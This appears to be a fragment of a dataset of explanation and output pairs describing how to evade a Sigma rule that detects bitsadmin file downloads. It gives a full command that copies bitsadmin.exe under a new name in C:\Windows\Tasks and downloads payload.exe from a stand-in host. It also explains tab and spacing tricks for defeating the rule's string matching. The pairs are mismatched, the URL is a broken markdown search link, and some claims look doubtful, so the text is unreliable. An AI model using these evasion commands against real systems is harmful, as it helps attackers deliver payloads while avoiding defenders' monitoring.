explanation: Using tab characters instead of spaces separates the arguments, avoiding the spaced patterns that the sigma rule looks for (/transfer, /create, /addfile) while still invoking bitsadmin to download a file via HTTP. The rule's selection_img matches, but selection_cmd and selection_cli_* conditions fail, so the rule does not trigger.

The detection logic for selection_cmd checks for the exact string ' /transfer ' (with a leading and trailing space). Because bitsadmin.exe handles parameter grouping natively, you can omit the space directly following the flag name (e.g., '/transfer/DownloadJob'), breaking the exact spacing sequence required by the rule while successfully executing the transfer.

output: copy C:\Windows\System32\bitsadmin.exe C:\Windows\Tasks\not_bits.exe && C:\Windows\Tasks\not_bits.exe /transfer MyJob [http://example.com/payload.exe](https://www.google.com/search?q=http://example.com/payload.exe) C:\Windows\Tasks\payload.exe
explanation: The rule mandates an 'and' logic between selection_img and the command line parameters. If bitsadmin.exe is copied out of its standard directory, renamed, and executed under a name that does not match '\bitsadmin.exe', the selection_img check fails depending on whether the log parser extracts the original filename metadata reliably.
